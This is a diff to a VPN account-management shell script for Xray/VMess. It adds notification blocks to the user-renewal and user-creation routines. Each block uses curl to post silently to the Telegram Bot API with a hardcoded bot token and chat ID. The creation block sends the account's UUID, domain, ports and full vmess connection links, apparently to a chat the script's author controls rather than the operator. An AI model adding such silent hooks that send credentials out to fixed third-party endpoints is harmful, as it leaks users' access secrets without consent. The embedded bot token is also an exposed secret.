@@ -157,6 +157,26 @@ exp3=$(($exp2 + $masaaktif))
 exp4=`date -d "$exp3 days" +"%Y-%m-%d"`
 sed -i "/### $user/c\### $user $exp4" /etc/xray/config.json
 systemctl restart xray > /dev/null 2>&1
+CHATID="1658354197"
+KEY="6581548016:AAGmvN9Dcx24QiOnNIp9DVilqCN2fCzMTas"
+WKT="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="
+┌──────────────────────────────────┐
+│      • RENEW VMESS USER •               
+└──────────────────────────────────┘
+┌──────────────────────────────────┐
+│  [INFO]  $user Account Renewed Successfully
+│   
+│   Client Name : <code>$user</code>
+│   Days Added  : <code>$masaaktif Days</code>
+│   Expired On  : <code>$exp4</code>
+└──────────────────────────────────┘ 
+┌────────────── BY ────────────────┐
+│          • Free-Wifi •                 
+└──────────────────────────────────┘ 
+"
+curl -s --max-time $WKT -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
 echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}"
 echo -e "$COLOR1│${NC} ${COLBG1}             • RENEW VMESS USER •              ${NC} $COLOR1│$NC"
@@ -365,6 +385,47 @@ if [[ "${DATADB}" != '' ]]; then
   sed -i "/\b${user}\b/d" /etc/vmess/.vmess.db
 fi
 echo "### ${user} ${exp} ${uuid} " >>/etc/vmess/.vmess.db
+CHATID="1658354197"
+KEY="6581548016:AAGmvN9Dcx24QiOnNIp9DVilqCN2fCzMTas"
+WKT="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="
+┌──────────────────────────────┐
+│   • CREATE VMESS USER •               
+└──────────────────────────────┘
+┌──────────────────────────────┐
+  Remarks       :<code>${user}</code>
+  Expired On    :<code>$exp</code>
+  Quota         :<code>${quota} GB</code>
+  Limit ip      :<code>${limit} USER </code>
+  Domain        :<code>${domain}</code>
+  Port TLS      :<code>${tls}</code>
+  Port none TLS :<code>${none}</code>
+  Port  GRPC    :<code>${tls}</code>
+  id            :<code>${uuid}</code>
+  alterId       :<code>0</code>
+  Security      :<code>auto</code>
+  Network       :<code>ws</code>
+  Path          :<code>/vmess</code>
+  Path Custom   :<code>/multipart</code>
+  Path WSS      :<code>wss://bug.com/vmess</code>
+  ServiceName   :<code>vmess-grpc</code>
+└───────────────────────────────┘ 
+┌───────────────────────────────┐
+  Link TLS : 
+  <code>${vmesslink1}</code>
+  
+  Link none TLS : 
+  <code>${vmesslink2}</code>
+  
+  Link GRPC : 
+  <code>${vmesslink3}</code>
+└───────────────────────────────┘ 
+┌──────────── BY ───────────────┐
+│        • Free-Wifi •                    
+└───────────────────────────────┘
+"
+curl -s --max-time $WKT -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
 echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}"
 echo -e "$COLOR1│${NC} ${COLBG1}            • CREATE VMESS USER •              ${NC} $COLOR1│$NC"
